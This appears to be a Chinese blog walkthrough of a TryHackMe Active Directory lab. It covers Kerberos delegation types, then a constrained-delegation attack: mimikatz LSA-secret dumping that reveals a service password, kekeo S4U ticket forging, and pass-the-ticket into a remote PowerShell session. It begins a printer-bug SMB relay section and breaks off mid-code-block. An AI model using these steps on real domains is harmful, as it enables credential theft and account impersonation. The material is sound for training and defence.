<h4 id="什么是非敏感的用户账户？"><a href="#什么是非敏感的用户账户？" class="headerlink" title="什么是非敏感的用户账户？"></a>什么是非敏感的用户账户？</h4><p>在 Kerberos 委派的上下文中，“非敏感用户账户”指的是<strong>没有被设置为拒绝委派的账户</strong>。</p>
<p>在 Active Directory 中，某些账户可以被标记为**“敏感且不可委派”**（<code>Account is sensitive and cannot be delegated</code>）或属于 <code>Protected Users</code> 组。</p>
<ul>
<li>如果一个账户被标记为敏感，或者属于 <code>Protected Users</code> 组，那么 KDC 会<strong>拒绝</strong>任何 S4U 请求，即不允许其他服务账户代表这个用户去访问任何其他服务。</li>
<li>攻击者通常会选择那些<strong>没有</strong>这些安全标记的普通用户账户进行冒充。虽然攻击者无法冒充域管理员，但他们可以冒充一个有权访问敏感数据库的普通用户，这同样能造成巨大的危害。</li>
</ul>
<h3 id="Resource-Based-Constrained-Delegation"><a href="#Resource-Based-Constrained-Delegation" class="headerlink" title="Resource-Based Constrained Delegation"></a>Resource-Based Constrained Delegation</h3><p>实际上，Kerberos 委派有三种类型。但这一种值得单独提出来说。**基于资源的约束性委派（RBCD）**由微软在 2012 年引入，它再次为 Kerberos 委派增加了额外的安全限制。</p>
<p>RBCD 彻底改变了委派模型。它不再是指定<strong>哪个对象</strong>可以委派给<strong>哪个服务</strong>，而是由<strong>服务本身</strong>来指定<strong>哪个对象</strong>可以委派给它。这使得服务所有者能够控制谁可以访问它。</p>
<p>在我们 Web 应用程序的例子中，这意味着我们不再需要在 Web 服务账户上指定它可以委派给数据库服务来访问数据库；而是可以在数据库服务上指定，允许 Web 服务账户委派访问它。</p>
<p>假设我们有权限为某个服务配置 RBCD。这意味着我们有能力为该服务的 AD 对象设置 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性。我们可以用我们拥有的一个 AD 账户的详细信息来填充这个属性。为了现在获得对该服务的访问权限，我们可以为我们控制的账户生成一个 TGT，这将允许我们与该服务进行交互。如果你想看一个 RBCD 漏洞利用的详细例子，可以看<a target="_blank" rel="noopener" href="https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/">这里</a>。</p>
<h3 id="三种委派的区别"><a href="#三种委派的区别" class="headerlink" title="三种委派的区别"></a>三种委派的区别</h3><p>这三种委派方式的主要区别在于<strong>谁拥有权限控制权</strong>，以及<strong>权限的范围有多大</strong>。</p>
<h4 id="非约束性委派-Unconstrained-Delegation"><a href="#非约束性委派-Unconstrained-Delegation" class="headerlink" title="非约束性委派 (Unconstrained Delegation)"></a>非约束性委派 (Unconstrained Delegation)</h4><ul>
<li><strong>控制权</strong>：权限控制权在<strong>服务账户</strong>本身。</li>
<li><strong>权限范围</strong>：<strong>无限制</strong>。</li>
<li><strong>工作原理</strong>：当用户访问一个配置了非约束性委派的服务器时，KDC 会将用户的 <strong>TGT (票据授权票据)</strong> 连同服务票据一起发送给服务器。服务器会将这个 TGT 存储在内存中。有了这个 TGT，服务器可以<strong>代表该用户</strong>去访问<strong>域中任何其他服务</strong>，没有任何限制。</li>
<li><strong>安全性</strong>：<strong>最不安全</strong>。一旦攻击者攻陷了这台服务器，他们就可以从内存中窃取所有用户的 TGT，从而完全冒充这些用户，包括域管理员。</li>
</ul>
<h4 id="约束性委派-Constrained-Delegation"><a href="#约束性委派-Constrained-Delegation" class="headerlink" title="约束性委派 (Constrained Delegation)"></a>约束性委派 (Constrained Delegation)</h4><ul>
<li><strong>控制权</strong>：权限控制权在<strong>服务账户</strong>。</li>
<li><strong>权限范围</strong>：<strong>有限制</strong>，但受限于服务账户本身。</li>
<li><strong>工作原理</strong>：管理员在 AD 中为<strong>服务账户</strong>配置一个列表，明确指定这个服务账户可以代表用户去访问<strong>哪些特定的服务</strong>（通过服务主名称 SPN 来指定）。当服务需要代表用户访问其他服务时，它会向 KDC 证明自己有代表用户的能力，然后 KDC 才会为它颁发一个专门用于访问指定服务的票据。</li>
<li><strong>安全性</strong>：比非约束性委派安全得多，因为它限制了服务可以访问的资源范围。即使服务账户被攻陷，攻击者也只能冒充用户去访问这个列表中指定的那些服务。</li>
</ul>
<h4 id="基于资源的约束性委派-Resource-Based-Constrained-Delegation-RBCD"><a href="#基于资源的约束性委派-Resource-Based-Constrained-Delegation-RBCD" class="headerlink" title="基于资源的约束性委派 (Resource-Based Constrained Delegation, RBCD)"></a>基于资源的约束性委派 (Resource-Based Constrained Delegation, RBCD)</h4><ul>
<li><strong>控制权</strong>：权限控制权在<strong>资源（或服务）所有者</strong>。</li>
<li><strong>权限范围</strong>：有限制，且限制在资源本身。</li>
<li><strong>工作原理</strong>：这种模式颠倒了控制逻辑。管理员不是在服务账户上配置它能访问哪些服务，而是在<strong>被访问的资源（例如 SQL 服务器）<strong>上配置一个列表，明确指定</strong>哪些服务账户</strong>被允许代表用户来访问它。</li>
<li><strong>安全性</strong>：<strong>最安全</strong>。这种模式将权限控制权下放给了资源所有者，他们可以更精细地控制谁可以访问他们的资源。这使得横向移动攻击更加困难，因为攻击者即使攻陷了某个服务账户，也不能随意冒充用户去访问未授权的资源。</li>
</ul>
<h4 id="总结表格"><a href="#总结表格" class="headerlink" title="总结表格"></a>总结表格</h4><table>
<thead>
<tr>
<th>特性</th>
<th>非约束性委派</th>
<th>约束性委派</th>
<th>基于资源的约束性委派 (RBCD)</th>
</tr>
</thead>
<tbody><tr>
<td><strong>控制权</strong></td>
<td>服务账户</td>
<td>服务账户</td>
<td><strong>资源账户</strong></td>
</tr>
<tr>
<td><strong>配置位置</strong></td>
<td>服务账户对象上</td>
<td>服务账户对象上</td>
<td><strong>资源（被访问服务）对象上</strong></td>
</tr>
<tr>
<td><strong>权限范围</strong></td>
<td>域内所有服务</td>
<td>指定的服务列表</td>
<td>允许访问资源的特定服务列表</td>
</tr>
<tr>
<td><strong>安全性</strong></td>
<td><strong>最低</strong></td>
<td>较高</td>
<td><strong>最高</strong></td>
</tr>
</tbody></table>
<h3 id="实践-3"><a href="#实践-3" class="headerlink" title="实践"></a>实践</h3><p>这个任务会利用受限制的委托完成，首先我们要做的是枚举可用的委托。让我们使用新的特权用户来执行网络命令。我们可以运行以下命令，使用 PowerSploit 的 Get-NetUser cmdlet 进行枚举：</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">Import-Module</span><span style="color: #ABB2BF"> C:\Tools\PowerView.ps1 </span></span>
<span class="line"><span style="color: #56B6C2">Get-NetUser</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">TrustedToAuth</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">logoncount               : </span><span style="color: #D19A66">39</span></span>
<span class="line"><span style="color: #ABB2BF">badpasswordtime          : </span><span style="color: #D19A66">1</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1601</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF"> AM</span></span>
<span class="line"><span style="color: #ABB2BF">distinguishedname        : CN</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">IIS Server,CN</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">Users,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">za,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">tryhackme,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">loc</span></span>
<span class="line"><span style="color: #ABB2BF">objectclass              : {top, person, organizationalPerson, user}</span></span>
<span class="line"><span style="color: #ABB2BF">displayname              : IIS Server</span></span>
<span class="line"><span style="color: #ABB2BF">lastlogontimestamp       : </span><span style="color: #D19A66">8</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">4</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">2025</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">11</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">50</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">10</span><span style="color: #ABB2BF"> AM</span></span>
<span class="line"><span style="color: #ABB2BF">userprincipalname        : svcIIS</span><span style="color: #E06C75">@za.tryhackme.loc</span></span>
<span class="line"><span style="color: #ABB2BF">name                     : IIS Server</span></span>
<span class="line"><span style="color: #ABB2BF">objectsid                : S</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">5</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">21</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">3885271727</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2693558621</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2658995185</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">6155</span></span>
<span class="line"><span style="color: #ABB2BF">samaccountname           : svcIIS</span></span>
<span class="line"><span style="color: #ABB2BF">codepage                 : </span><span style="color: #D19A66">0</span></span>
<span class="line"><span style="color: #ABB2BF">samaccounttype           : USER_OBJECT</span></span>
<span class="line"><span style="color: #ABB2BF">accountexpires           : NEVER</span></span>
<span class="line"><span style="color: #ABB2BF">countrycode              : </span><span style="color: #D19A66">0</span></span>
<span class="line"><span style="color: #ABB2BF">whenchanged              : </span><span style="color: #D19A66">8</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">4</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">2025</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">50</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">10</span><span style="color: #ABB2BF"> AM</span></span>
<span class="line"><span style="color: #ABB2BF">instancetype             : </span><span style="color: #D19A66">4</span></span>
<span class="line"><span style="color: #ABB2BF">usncreated               : </span><span style="color: #D19A66">78494</span></span>
<span class="line"><span style="color: #ABB2BF">objectguid               : 11e42287</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">0a25</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">4d73</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">800d</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">b62e2d2a2a4b</span></span>
<span class="line"><span style="color: #ABB2BF">sn                       : Server</span></span>
<span class="line"><span style="color: #ABB2BF">lastlogoff               : </span><span style="color: #D19A66">1</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1601</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF"> AM</span></span>
<span class="line"><span style="color: #ABB2BF">msds</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">allowedtodelegateto : {WSMAN</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">THMSERVER1.za.tryhackme.loc, WSMAN</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">THMSERVER1, http</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">THMSERVER1.za.tryhackme.loc,</span></span>
<span class="line"><span style="color: #ABB2BF">                           http</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">THMSERVER1}</span></span>
<span class="line"><span style="color: #ABB2BF">objectcategory           : CN</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">Person,CN</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">Schema,CN</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">Configuration,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">tryhackme,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">loc</span></span>
<span class="line"><span style="color: #ABB2BF">dscorepropagationdata    : </span><span style="color: #D19A66">1</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1601</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF"> AM</span></span>
<span class="line"><span style="color: #ABB2BF">serviceprincipalname     : HTTP</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">svcServWeb.za.tryhackme.loc</span></span>
<span class="line"><span style="color: #ABB2BF">givenname                : IIS</span></span>
<span class="line"><span style="color: #ABB2BF">lastlogon                : </span><span style="color: #D19A66">8</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">5</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">2025</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">43</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">56</span><span style="color: #ABB2BF"> AM</span></span>
<span class="line"><span style="color: #ABB2BF">badpwdcount              : </span><span style="color: #D19A66">0</span></span>
<span class="line"><span style="color: #ABB2BF">cn                       : IIS Server</span></span>
<span class="line"><span style="color: #ABB2BF">useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION</span></span>
<span class="line"><span style="color: #ABB2BF">whencreated              : </span><span style="color: #D19A66">4</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">27</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">2022</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">11</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">26</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">21</span><span style="color: #ABB2BF"> AM</span></span>
<span class="line"><span style="color: #ABB2BF">primarygroupid           : </span><span style="color: #D19A66">513</span></span>
<span class="line"><span style="color: #ABB2BF">pwdlastset               : </span><span style="color: #D19A66">4</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">29</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">2022</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">11</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">50</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">25</span><span style="color: #ABB2BF"> AM</span></span>
<span class="line"><span style="color: #ABB2BF">usnchanged               : </span><span style="color: #D19A66">176228</span></span></code></pre></div></div></figure>

<p>从上面的输出（关注 <code>msds-allowedtodelegateto</code>）我们可以看到 svcIIS 账户可以在 THMSERVER1 上委派 HTTP 和 WSWAN 服务。你会认为这意味着我们只能代表冒充用户访问网站。但是，PowerShell Remoting 也使用 HTTP 和 WSMAN 服务。最理想的选择是冒充 Tier 1 管理员，因为这样我们就能获得 THMSERVER1 的管理访问权限。</p>
<p>如果你在 THMWRK1 上执行适当的后渗透枚举，你会发现主机上有一个以 <code>svcIIS</code> 用户身份运行的服务。由于我们现在拥有管理权限，因此我们可以利用这一点来转储 LSASecrets，这是 Windows 注册表配置单元的一部分，其中存储了 Windows 服务等功能的凭据。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 运行 mimikatz</span></span>
<span class="line"><span style="color: #ABB2BF">C:\Tools\mimikatz_trunk\x64\</span><span style="color: #56B6C2">mimikatz.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 提升到 SYSTEM 权限</span></span>
<span class="line"><span style="color: #ABB2BF">token::elevate</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 从注册表配置单元提取明文凭据</span></span>
<span class="line"><span style="color: #ABB2BF">lsadump::secrets</span></span>
<span class="line"><span style="color: #ABB2BF">...</span></span>
<span class="line"><span style="color: #ABB2BF">Secret  : _SC_thmwinauth </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF"> service </span><span style="color: #98C379">&#39;thmwinauth&#39;</span><span style="color: #ABB2BF"> with username : svcIIS</span><span style="color: #E06C75">@za.tryhackme.loc</span></span>
<span class="line"><span style="color: #ABB2BF">cur</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">text: Password1@</span></span></code></pre></div></div></figure>

<p>现在有了 svcIIS 账户的密码，我们能用 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">Kekeo</a> 和 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/security">Mimikatz</a> 组合实现 Kerberos Delegation 攻击，我们会用 Kekeo 生成 ticket 然后用 Mimikatz 去加载 ticket 进内存。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 找一个受害者</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;Tier 1 Admins&quot;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># t1_eileen.burton</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 执行 kekeo</span></span>
<span class="line"><span style="color: #ABB2BF">C:\Tools\kekeo\x64\</span><span style="color: #56B6C2">kekeo.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 生成一个 svcIIS 的 TGT</span></span>
<span class="line"><span style="color: #ABB2BF">tgt::ask </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:svcIIS </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">password:Password1@</span></span></code></pre></div></div></figure>

<p>现在我们有了可以执行委托的账户的 TGT，就可以为要冒充的账户伪造 TGS 请求了。我们需要对 HTTP 和 WSMAN 执行此操作，以便在 THMSERVER1 上创建 PSSession：</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 以用户 t1_eileen.burton 的身份生成一个 HTTP TGS</span></span>
<span class="line"><span style="color: #ABB2BF">tgs::s4u </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">tgt:TGT_svcIIS</span><span style="color: #E06C75">@ZA.TRYHACKME.LOC_krbtgt</span><span style="color: #ABB2BF">~za.tryhackme.loc</span><span style="color: #E06C75">@ZA.TRYHACKME.LOC.kirbi</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:t1_eileen.burton </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">service:http</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">THMSERVER1.za.tryhackme.loc</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 以用户 t1_eileen.burton 的身份生成一个 WSMAN TGS</span></span>
<span class="line"><span style="color: #ABB2BF">tgs::s4u </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">tgt:TGT_svcIIS</span><span style="color: #E06C75">@ZA.TRYHACKME.LOC_krbtgt</span><span style="color: #ABB2BF">~za.tryhackme.loc</span><span style="color: #E06C75">@ZA.TRYHACKME.LOC.kirbi</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:t1_eileen.burton </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">service:wsman</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">THMSERVER1.za.tryhackme.loc</span></span></code></pre></div></div></figure>

<p>现在用 mimikatz 导入这两个 TGS：</p>
<figure class="shiki PowerShell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div><div class="code"><pre><code># 打开 mimikatz
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
privilege::debug

# 载入 TGS
kerberos::ptt TGS_t1_eileen.burton@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
kerberos::ptt TGS_t1_eileen.burton@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

exit

# 使用 klist 查看载入的 TGS
klist

Current LogonId is 0:0x3bb224

Cached Tickets: (2)

#0>     Client: t1_eileen.burton @ ZA.TRYHACKME.LOC
        Server: http/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/5/2025 7:07:51 (local)
        End Time:   8/5/2025 17:07:48 (local)
        Renew Time: 8/12/2025 7:07:48 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

#1>     Client: t1_eileen.burton @ ZA.TRYHACKME.LOC
        Server: wsman/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/5/2025 7:08:01 (local)
        End Time:   8/5/2025 17:07:48 (local)
        Renew Time: 8/12/2025 7:07:48 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
        
# 进入 PSSession
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc</code></pre></div></div></figure>

<p>这下就有 THMSERVER1 的 Shell 了。</p>
<h3 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h3><p><a target="_blank" rel="noopener" href="https://blog.netwrix.com/2021/11/30/what-is-kerberos-delegation-an-overview-of-kerberos-delegation/">What Is Kerberos Delegation? An Overview of Kerberos Delegation</a></p>
<h2 id="Exploiting-Relays"><a href="#Exploiting-Relays" class="headerlink" title="Exploiting Relays"></a>Exploiting Relays</h2><p>这个房间讲的就是利用 SMB 没用强制要求加密的漏洞，导致认证可以被截获。</p>
<p>Windows 主机都有一个<strong>机器账户</strong>。本质上，这是与该机器关联的用户账户。除非有人篡改过主机的账户，否则这些账户的密码是<strong>不可破解</strong>的。默认情况下，它们的密码长达 120 个字符（UTF16 编码），并每 30 天自动轮换一次。</p>
<p>在 AD 中，这些机器账户被大量用于不同的服务中。不同的<strong>域控制器</strong>使用它们的机器账户来同步 AD 的更新和更改。当你代表你正在工作的主机请求一个证书时，该主机的机器账户会被用于向 AD 证书服务进行身份验证。</p>
<p>在 AD 中有一个特殊情况，即一台机器对另一台机器拥有管理权限。本质上，在 AD 配置中，一台主机被授予了对另一台主机的管理权限。同样，这是预期的功能，例如必须进行同步的<strong>域控制器</strong>或 SQL 集群。然而，这些实例为<strong>强制认证</strong>提供了一个非常有趣的攻击途径。</p>
<p>使用以下的语法能在 BloodHound 中查询到这个途径：</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">MATCH p=(c1:Computer)-[r1:MemberOf*1..]-&gt;(g:Group)-[r2:AdminTo]-&gt;(n:Computer) RETURN p</span></span></code></pre></div></div></figure>

<p>这里我梳理一下，SERVER MANAGEMENT 组是 THMSERVER1 的管理员，然后 THMSERVER2 是 SERVER MANAGEMENT 组的一员，这就代表 THMSERVER2 对 THMSERVER1 有管理权限。</p>
<h3 id="打印机-Bug"><a href="#打印机-Bug" class="headerlink" title="打印机 Bug"></a>打印机 Bug</h3><p>这个打印机漏洞是 <strong>MS-RPRN 协议</strong>（打印系统远程协议）的一个“功能”，它允许一个域用户<strong>远程强制</strong>运行了 <strong>Print Spooler 服务</strong>的目标主机向一个<strong>任意的 IP 地址</strong>进行身份验证。</p>
<p>因此，要利用这一点，除了拥有机器账户的管理权限之外，我们还需要满足以下四个条件：</p>
<ol>
<li>一套有效的 <strong>AD 账户凭据</strong>。</li>
<li>与目标主机的 <strong>SMB 服务</strong>的网络连接。</li>
<li>目标主机必须运行 <strong>Print Spooler 服务</strong>。</li>
<li>主机必须<strong>没有强制启用 SMB 签名</strong>。</li>
</ol>
<p>我们要在对 THMSERVER2 没有访问权限的情况下确定 Print Spooler Service 是否在运行。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">GWMI Win32_Printer </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Computer thmserver2.za.tryhackme.loc</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 如果提示 Access Denied 就用这个命令</span></span>
<span class="line"><span style="color: #56B6C2">Get-PrinterPort</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ComputerName thmserver2.za.tryhackme.loc</span></span></code></pre></div></div></figure>

<p>如果都获取不到结果，直接忽略他，靶机环境肯定是可以用的</p>
<h3 id="SMB-签名"><a href="#SMB-签名" class="headerlink" title="SMB 签名"></a>SMB 签名</h3><p>为了中继强制的身份验证尝试，<strong>不应该强制启用 SMB 签名</strong>。<strong>允许 SMB 签名</strong>和<strong>强制启用 SMB 签名</strong>是有区别的。由于一些遗留系统不支持 SMB 签名，默认情况下，SMB 的配置是<strong>允许但非强制签名</strong>，这意味着只有在双方都支持时才会使用。由于我们将托管一个恶意的 SMB 服务器，我们可以确保我们的服务器不支持签名，从而强制目标不签署 SMB 身份验证尝试。</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/383408.html">https://www.freebuf.com/articles/network/383408.html</a></p>
<p>检查 SMB 强制签名是否打开可以用 nmap 扫描：</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">nmap</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--script=smb2-security-mode</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p445</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thmserver1.za.tryhackme.loc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thmserver2.za.tryhackme.loc</span></span></code></pre></div></div></figure>

<p>我们会用 <a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">SpoolSample</a> 实现这个认证中继攻击，强制 THMSERVER2 去向我们进行身份认证，再用 impacket 的 <code>ntlmrelayx.py</code> 中继到 THMSERVER1，这样我们就相当于有 THMSERVER2 的权限了（中继服务器把认证截获了，不是这台机器的 Shell 权限，指的是 THMSERVER2 访问 THMSERVER1 的权限）。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 执行命令</span></span>
